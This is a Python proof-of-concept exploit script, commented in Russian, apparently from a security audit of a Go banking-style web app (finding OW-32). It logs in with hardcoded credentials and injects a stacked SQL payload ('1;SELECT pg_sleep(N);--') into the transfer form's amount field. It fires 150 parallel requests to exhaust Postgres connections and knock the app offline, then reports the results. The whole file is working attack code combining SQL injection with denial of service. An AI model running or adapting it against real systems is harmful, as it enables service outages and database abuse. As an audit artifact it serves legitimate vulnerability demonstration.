#!/usr/bin/env python3
"""
04 — исчерпание Postgres из-за неограниченного пула sql.DB (OW-32).

У sql.DB не вызван SetMaxOpenConns (server.go:25), значит на каждый
параллельный запрос приложение открывает своё соединение к Postgres.
У postgres:16-alpine max_connections=100. Через SQL-инъекцию в
/transfer/new (handlers_money.go:172-180) выполняется pg_sleep(N),
соединение с базой держится, и после ~100 запросов БД отвечает
"sorry, too many clients already" — дальше приложение падает по 500
даже на обычном логине.

Использование:
  python3 04_unlimited_db_pool.py [BASE_URL] [PARALLEL] [HOLD]
"""
import http.cookiejar
import sys
import threading
import time
import urllib.parse
import urllib.request

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:18081"
PARALLEL = int(sys.argv[2]) if len(sys.argv) > 2 else 150
HOLD = int(sys.argv[3]) if len(sys.argv) > 3 else 40

jar = http.cookiejar.CookieJar()
opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))
login = urllib.parse.urlencode(
    {"login": "ivanov", "password": "workplace1", "return": "/"}).encode()
opener.open(urllib.request.Request(BASE + "/login", data=login), timeout=10)
sess = next((c.value for c in jar if c.name == "ow_session"), None)
if not sess:
    sys.exit("не удалось войти")


def slow_query(i: int, results: dict) -> None:
    # инъекция: SELECT 1;SELECT pg_sleep(N) — Exec ждёт завершения
    data = urllib.parse.urlencode({
        "recipient": "petrova",
        # итоговый SQL: SELECT 1;SELECT pg_sleep(N);--::bigint
        "amount_rub": "1;SELECT pg_sleep(%d);--" % HOLD,
        "memo": "pool-%d" % i,
    }).encode()
    req = urllib.request.Request(
        BASE + "/transfer/new", data=data,
        headers={"Cookie": "ow_session=" + sess})
    try:
        with urllib.request.urlopen(req, timeout=HOLD + 30) as r:
            body = r.read().decode("utf-8", "replace")
            results[i] = "500-too-many" if "too many clients" in body else (
                "sleep-done" if "Некорректная" in body or "Некоррект" in body else r.status)
    except urllib.error.HTTPError as e:
        body = e.read().decode("utf-8", "replace")
        results[i] = "500-too-many" if "too many clients" in body else e.code
    except Exception as e:  # noqa: BLE001
        results[i] = str(e)


print("== OW-32: обычный запрос до атаки ==")
t = time.time()
with urllib.request.urlopen(BASE + "/login", timeout=10) as r:
    print("GET /login -> %d за %.2fs" % (r.status, time.time() - t))

print("\n== OW-32: %d параллельных запросов с pg_sleep(%d) ==" % (PARALLEL, HOLD))
results: dict = {}
threads = [
    threading.Thread(target=slow_query, args=(i, results))
    for i in range(PARALLEL)
]
t = time.time()
for th in threads:
    th.start()

# пока потоки держат соединения к БД, проверяем обычный запрос
time.sleep(5)
print("\n== OW-32: обычный запрос во время удержания %d соединений с БД ==" % PARALLEL)
t2 = time.time()
try:
    with urllib.request.urlopen(BASE + "/login", timeout=15) as r:
        body = r.read().decode("utf-8", "replace")
        print("GET /login -> %d за %.2fs" % (r.status, time.time() - t2))
        if "too many clients" in body:
            print("  тело ответа: sorry, too many clients already")
except Exception as e:  # noqa: BLE001
    print("GET /login -> сломался за %.2fs: %s" % (time.time() - t2, e))

for th in threads:
    th.join(HOLD + 30)
errs = sum(1 for v in results.values() if v != 200)
tm = sum(1 for v in results.values() if v == "500-too-many")
print("ответов: %d, не-200: %d, из них 'too many clients': %d, заняло %.1fs"
      % (len(results), errs, tm, time.time() - t))
print("┌─ АРТЕФАКТ · OW-32")
print("│ concurrent requests: %d; non-200: %d; too-many-clients: %d" %
      (len(results), errs, tm))
print("│ обычный логин во время исчерпания соединений — см. измерение выше")
print("└─")
if errs:
    print("\033[32m[+] неограниченный пул исчерпал max_connections=100: %d ответов не-200\033[0m" % errs)
else:
    print("\033[31m[-] исчерпание пула не подтвердилось: все ответы 200\033[0m")
seen = set()
for v in results.values():
    if v not in seen:
        print("  пример ответа:", v)
        seen.add(v)
    if len(seen) >= 5:
        break

print("\n== OW-32: после завершения ==")
t = time.time()
try:
    with urllib.request.urlopen(BASE + "/login", timeout=15) as r:
        print("GET /login -> %d за %.2fs (БД отдохнула, пул самовосстановился)"
              % (r.status, time.time() - t))
except Exception as e:  # noqa: BLE001
    print("GET /login -> сломался за %.2fs: %s" % (time.time() - t, e))

print("\nБД освободится сама через ~%d с (pg_sleep завершится)" % HOLD)
